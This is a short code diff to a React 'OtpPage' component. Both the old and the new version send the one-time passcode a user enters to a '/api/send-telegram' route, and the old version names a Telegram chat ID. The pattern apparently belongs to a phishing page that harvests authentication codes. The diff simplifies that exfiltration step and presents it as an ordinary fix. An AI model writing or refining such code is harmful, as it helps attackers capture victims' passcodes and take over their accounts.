@@ -33,22 +33,14 @@ export default function OtpPage() {
     setLoading(true);
     setError(null);
 
-    const message = `🔐 *OTP Submitted*\n\n🔢 OTP: ${otp}`;
-
     try {
-      const telegramResponse = await fetch('api/send-telegram',
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: process.env.TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: "Markdown",
-          }),
-        }
-      );
+      const telegramResponse = await fetch("/api/send-telegram", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ otp }), // ✅ only send otp
+    });
 
       setLoading(false);
 
